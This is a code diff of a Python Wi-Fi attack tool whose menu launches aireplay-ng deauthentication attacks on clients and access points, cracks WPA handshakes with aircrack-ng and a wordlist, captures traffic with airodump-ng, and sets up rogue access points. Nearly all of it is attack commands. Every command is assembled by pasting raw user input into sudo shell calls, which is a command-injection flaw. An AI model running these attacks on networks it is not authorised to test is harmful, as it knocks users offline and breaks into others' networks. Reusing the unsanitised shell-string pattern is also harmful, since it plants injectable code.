@@ -8,14 +8,14 @@ from wifi import Cell, Scheme
 interfaz = 'wlxc04a00118487'
 '''
 interfaz = raw_input('Network interface: ')
-os.system("sudo ifconfig "+interfaz+" down")
-os.system("sudo iwconfig "+interfaz+" mode managed")
-os.system("sudo ifconfig "+interfaz+" up")
+#os.system("sudo ifconfig "+interfaz+" down")
+#os.system("sudo iwconfig "+interfaz+" mode managed")
+#os.system("sudo ifconfig "+interfaz+" up")
 redes = []
 
 
 def menu():
-	opt_ = raw_input('\nOptions: \n1: Scan \n2: Connect (working on it)\n3: Capture traffic (working on it)\n4: Crack WPA/WPA2 from pcap\n5: Deauth attack \n6: Create AP\n')
+	opt_ = raw_input('\nOptions: \n1: Scan \n2: Connect (working on it)\n3: Capture traffic \n4: Crack handshake from pcap\n5: Deauth attack \n6: Create AP\n')
 	if   opt_ == "1":
 		scan()
 	elif opt_=="2":
@@ -34,6 +34,9 @@ def menu():
 
 def create_ap():
 	ap_type=raw_input("Options: \n1: Open \n2: WPE \n3: WPA2\n4: WPA-Enterprise (AP+Radius Server) \n")
+	if not os.path.isdir("temp"):
+		os.system("mkdir temp")
+
 	if ap_type == "1":
 		essid=raw_input("Network name:")
 		channel=raw_input("Channel:")
@@ -84,9 +87,9 @@ def deauth_client():
 	essid=red.get("ssid")
 	channel=red.get("canal")
 	client_mac = raw_input("Client MAC:")
-	os.system("sudo ifconfig "+interfaz+" down")
-	os.system("sudo iwconfig "+interfaz+" mode monitor")
-	os.system("sudo ifconfig "+interfaz+" up")
+	#os.system("sudo ifconfig "+interfaz+" down")
+	#os.system("sudo iwconfig "+interfaz+" mode monitor")
+	#os.system("sudo ifconfig "+interfaz+" up")
 	os.system("sudo iwconfig "+interfaz+" channel "+channel)
 	os.system("sudo aireplay-ng -0 0 -a "+ap_mac+" -c "+client_mac+" -e \""+essid+"\" "+interfaz)
 
@@ -97,9 +100,9 @@ def deauth_ap():
 	ap_mac=red.get("mac")
 	essid=red.get("ssid")
 	channel=red.get("canal")
-	os.system("sudo ifconfig "+interfaz+" down")
-	os.system("sudo iwconfig "+interfaz+" mode monitor")
-	os.system("sudo ifconfig "+interfaz+" up")
+	#os.system("sudo ifconfig "+interfaz+" down")
+	#os.system("sudo iwconfig "+interfaz+" mode monitor")
+	#os.system("sudo ifconfig "+interfaz+" up")
 	os.system("sudo iwconfig "+interfaz+" channel "+channel)
 	cmmd= ("sudo aireplay-ng -0 0 -a "+ap_mac+" -e \""+essid+"\" "+interfaz)
 	os.system(cmmd)
@@ -116,15 +119,13 @@ def deauth():
 def crack_wpa():
 	dictionary = raw_input("Dictionary file: ")
 	pcap_name = raw_input("Pcap file name: ")
-	os.system("aircrack-ng -w "+dictionary+" "+pcap_name)
+	os.system("sudo aircrack-ng -w "+dictionary+" "+pcap_name)
 
 
 def capture_traffic():
-	pcap_name = raw_input("Pcap file name: ")
-	os.system("touch "+pcap_name)
-	os.system("chmod 777 "+pcap_name)
-	os.system("sudo tshark -w "+pcap_name+" -i "+interfaz)
-
+	output_format="pcap"
+	pcap_name = raw_input("Ouput file name (without extension): ")
+	os.system("sudo airodump-ng -w "+pcap_name+" --output-format "+output_format+" "+interfaz)
 
 def connect():
 	id_red = raw_input('Select id: ')
@@ -186,7 +187,7 @@ def scan():
 
 
 def main():
-	scan()
+	#scan()
 	menu()
 
 
